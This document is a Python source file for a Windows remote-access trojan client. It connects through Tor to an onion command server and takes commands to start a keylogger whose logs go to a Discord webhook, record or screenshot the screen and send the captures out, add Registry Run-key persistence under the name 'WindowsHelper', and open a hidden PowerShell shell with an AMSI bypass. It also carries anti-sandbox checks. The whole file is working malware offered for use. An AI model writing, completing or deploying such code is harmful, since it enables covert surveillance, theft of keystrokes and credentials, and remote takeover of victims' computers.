import cv2
import mss
import numpy as np
import os
import tempfile
import requests
import time
import pyaudio
import wave
from pynput import keyboard
import schedule
import socket
import subprocess
import threading
import sys
import ssl
import socks
import base64
import psutil
import json
import winreg   # for persistence

# ==================== CONFIG ====================
ONION_ADDRESS = "your_onion_address.onion"   # replace with your actual onion
C2_PORT = 4443
TOR_PROXY = ('127.0.0.1', 9050)

# Discord webhooks (still used for keylog)
KEYLOGGER_WEBHOOK_URL = 'https://discord.com/api/webhooks/...'   # replace

KEYLOG_PATH = "C:\\Users\\Public\\Documents\\keyhits.txt"

# Module states
recording_active = False       # screen recording
screenshot_scheduled = False   # scheduled screenshots
keylogger_active = False       # keylogger
screenshot_thread = None
screenshot_event = threading.Event()

# ==================== ANTI-SANDBOX ====================
def is_sandbox():
    try:
        if time.time() - psutil.boot_time() < 1800:
            return True
        if psutil.cpu_count() < 2:
            return True
        disk = psutil.disk_usage('/')
        if disk.total < 60 * 1024**3:
            return True
    except:
        pass
    return False

if is_sandbox():
    print("Sandbox detected – sleeping...")
    time.sleep(30)

# ==================== PERSISTENCE ====================
def add_persistence():
    """Add the current executable to Windows Registry Run key."""
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsHelper", 0, winreg.REG_SZ, exe_path + ' --silent')
        return True
    except Exception as e:
        print(f"Persistence error: {e}")
        return False

# ==================== CORE FUNCTIONS ====================
def send_to_discord(file_path, webhook_url):
    with open(file_path, "rb") as file:
        response = requests.post(webhook_url, files={"file": file})
    return response.status_code

def record_screen(output_path, record_time=30, fps=8):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        width, height = monitor["width"], monitor["height"]
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        for _ in range(record_time * fps):
            sct_img = sct.grab(monitor)
            frame = cv2.cvtColor(np.array(sct_img), cv2.COLOR_BGRA2BGR)
            out.write(frame)
        out.release()

def take_screenshot():
    with mss.mss() as sct:
        return sct.grab(sct.monitors[1])

def send_screenshot_to_server(sock, img):
    # Convert to PNG and base64
    import io
    from PIL import Image   # need to install pillow
    pil_img = Image.frombytes('RGB', (img.width, img.height), img.rgb)
    buf = io.BytesIO()
    pil_img.save(buf, format='PNG')
    data = base64.b64encode(buf.getvalue()).decode()
    msg = {'type': 'screenshot', 'data': data}
    sock.send((json.dumps(msg) + "\n").encode())

# ==================== KEYLOGGER ====================
ignored_keys = {
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l,
    keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.cmd_l,
    keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l,
    keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l,
    keyboard.Key.tab, keyboard.Key.esc, keyboard.Key.space,
    keyboard.Key.backspace, keyboard.Key.enter
}
last_key_pressed = None
keylog_file = KEYLOG_PATH

def key_press(key):
    global last_key_pressed
    if not keylogger_active:
        return
    try:
        if key != last_key_pressed:
            with open(keylog_file, 'a') as logKey:
                if hasattr(key, 'char') and key.char is not None:
                    logKey.write(key.char)
                elif key not in ignored_keys:
                    logKey.write(f'[{key}]')
        last_key_pressed = key
    except: pass

def key_release(key):
    global last_key_pressed
    last_key_pressed = None

def send_keylog_to_discord():
    if not keylogger_active:
        return
    try:
        with open(keylog_file, 'rb') as file:
            response = requests.post(KEYLOGGER_WEBHOOK_URL,
                                     data={'content': 'Keylog file'},
                                     files={'file': file})
            print("Keylog sent." if response.status_code == 200 else f"Failed: {response.status_code}")
    except Exception as e:
        print(f"Keylog error: {e}")

# ==================== MODULE CONTROL FUNCTIONS ====================
def screen_recording_loop(sock):
    """Runs continuously while recording_active is True."""
    clip_number = 1
    while True:
        if not recording_active:
            time.sleep(1)
            continue
        try:
            temp_dir = tempfile.gettempdir()
            path = os.path.join(temp_dir, f"screen_record_{clip_number}.mp4")
            record_screen(path, record_time=30)
            # Send via Discord (or could send to server)
            if send_to_discord(path, SCREEN_WEBHOOK_URL) == 200:
                os.remove(path)
                clip_number += 1
            else:
                time.sleep(5)
        except Exception as e:
            print(f"Screen error: {e}")
            time.sleep(5)

def screenshot_scheduler(sock):
    """Runs scheduled screenshots while screenshot_scheduled is True."""
    while True:
        if not screenshot_scheduled:
            time.sleep(1)
            continue
        try:
            img = take_screenshot()
            send_screenshot_to_server(sock, img)
            time.sleep(30)   # every 30 seconds
        except Exception as e:
            print(f"Screenshot error: {e}")
            time.sleep(5)

# ==================== C2 CONNECTION & COMMAND DISPATCH ====================
def connect_to_c2():
    s = socks.socksocket()
    s.set_proxy(socks.SOCKS5, *TOR_PROXY)
    s.connect((ONION_ADDRESS, C2_PORT))
    # TLS wrapper (optional)
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context.wrap_socket(s, server_hostname=ONION_ADDRESS)
    except:
        return s

def interactive_shell(sock):
    """Spawn PowerShell with AMSI bypass, fed via stdin."""
    ps_script = (
        '$amsi = [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\');'
        '$field = $amsi.GetField(\'amsiInitFailed\',\'NonPublic,Static\');'
        '$field.SetValue($null,$true);'
        'function main { '
        '    $ErrorActionPreference = "Stop"; '
        '    while ($true) { '
        '        $cmd = Read-Host; '
        '        if ($cmd -eq "exit") { break }; '
        '        try { '
        '            $output = Invoke-Expression $cmd 2>&1 | Out-String; '
        '            if ($output -eq "") { $output = "Command executed successfully." } '
        '        } catch { '
        '            $output = $_.Exception.Message '
        '        }; '
        '        Write-Output $output '
        '    } '
        '}; main'
    )
    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
    p = subprocess.Popen(
        ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        creationflags=creationflags
    )
    p.stdin.write((ps_script + "\n").encode())
    p.stdin.flush()
    time.sleep(0.5)

    def read_output():
        while True:
            out = p.stdout.read(4096)
            if not out:
                break
            sock.send(out)
    threading.Thread(target=read_output, daemon=True).start()

    while True:
        data = sock.recv(4096)
        if not data:
            break
        p.stdin.write(data)
        p.stdin.flush()
    p.terminate()

def c2_handler():
    global recording_active, screenshot_scheduled, keylogger_active
    while True:
        try:
            s = connect_to_c2()
            print("[C2] Connected.")
            # Start background threads for modules (they will check flags)
            threading.Thread(target=screen_recording_loop, args=(s,), daemon=True).start()
            threading.Thread(target=screenshot_scheduler, args=(s,), daemon=True).start()

            while True:
                data = s.recv(4096)
                if not data:
                    break
                try:
                    msg = json.loads(data.decode())
                    cmd = msg.get('cmd')
                except:
                    # fallback to plain text (old commands)
                    cmd = data.decode().strip()

                if cmd == 'keylog_start':
                    keylogger_active = True
                    s.send(b'[+] Keylogger started\n')
                elif cmd == 'keylog_stop':
                    keylogger_active = False
                    send_keylog_to_discord()
                    s.send(b'[+] Keylogger stopped, logs sent\n')
                elif cmd == 'screen_start':
                    recording_active = True
                    s.send(b'[+] Screen recording started\n')
                elif cmd == 'screen_stop':
                    recording_active = False
                    s.send(b'[+] Screen recording stopped\n')
                elif cmd == 'screenshot_start':
                    screenshot_scheduled = True
                    s.send(b'[+] Scheduled screenshots started\n')
                elif cmd == 'screenshot_stop':
                    screenshot_scheduled = False
                    s.send(b'[+] Scheduled screenshots stopped\n')
                elif cmd == 'screenshot':
                    # Take one screenshot and send to server
                    img = take_screenshot()
                    send_screenshot_to_server(s, img)
                    s.send(b'[+] Screenshot sent to server\n')
                elif cmd == 'shell':
                    s.send(b'[+] Spawning interactive shell...\n')
                    interactive_shell(s)
                    s.send(b'[+] Shell closed\n')
                elif cmd == 'persistence':
                    if add_persistence():
                        s.send(b'[+] Persistence enabled\n')
                    else:
                        s.send(b'[!] Persistence failed\n')
                elif cmd == 'status':
                    status = f"Keylogger: {'ON' if keylogger_active else 'OFF'}\nScreen Rec: {'ON' if recording_active else 'OFF'}\nScreenshots: {'ON' if screenshot_scheduled else 'OFF'}\n"
                    s.send(status.encode())
                elif cmd == 'exit':
                    s.send(b'[+] Exiting\n')
                    os._exit(0)
                else:
                    s.send(b'Unknown command. Available: keylog_start/stop, screen_start/stop, screenshot_start/stop, screenshot, shell, persistence, status, exit\n')
        except Exception as e:
            print(f"[C2] Error: {e}. Reconnecting in 10s...")
            time.sleep(10)
        finally:
            try:
                s.close()
            except:
                pass

# ==================== MAIN ====================
if __name__ == "__main__":
    # Create keylog file
    if not os.path.exists(KEYLOG_PATH):
        open(KEYLOG_PATH, 'a').close()

    # Start keylogger listener (it will check keylogger_active flag)
    listener = keyboard.Listener(on_press=key_press, on_release=key_release)
    listener.start()

    # Start C2 thread
    threading.Thread(target=c2_handler, daemon=True).start()
    print("[C2] Client started.")

    # Keep main thread alive
    while True:
        time.sleep(1)
